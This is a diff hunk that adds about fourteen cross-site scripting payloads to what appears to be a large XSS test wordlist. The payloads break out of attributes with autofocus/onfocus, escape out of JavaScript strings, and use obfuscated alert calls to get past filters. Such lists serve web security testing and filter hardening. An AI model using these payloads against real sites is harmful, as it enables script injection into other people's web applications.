@@ -6605,6 +6605,20 @@ feed:data:text/html,&#x3c;script>alert('Top Page Location: '+document.location+'
 <script>$=1,alert($)</script>
 <form><button formaction="javascript:alert(1)">
 <div style=xss:expression(alert(1))>
+"><script>alert(1)</script>    //from sudo.co.il
+" autofocus onfocus="alert(1)
+"autofocus/onfocus="alert(1)
+"autofocus/onfocus="confirm&#40;1&#41;
+"autofocus/onfocus="confirm&#40;1&#41;
+'-alert(1)-'
+\'-alert(1);<!--
+\'-alert(1);//
+" autofocus="" onfocus="alert(1)
+"};this[8680439..toString(30)](1);{"
+"};this[8680439..toString(30)](1);{"
+x';x=top["al"%2B"ert"](1);//
+x';x=this["al"%2B"ert"](1);//
+#<script>alert(1)</script>
 <div style=xss:expression(1)-alert(1)>
 <div style=xss:expressio\6e(alert(1))>
 <div style=xss:expressio\006e(alert(1))>
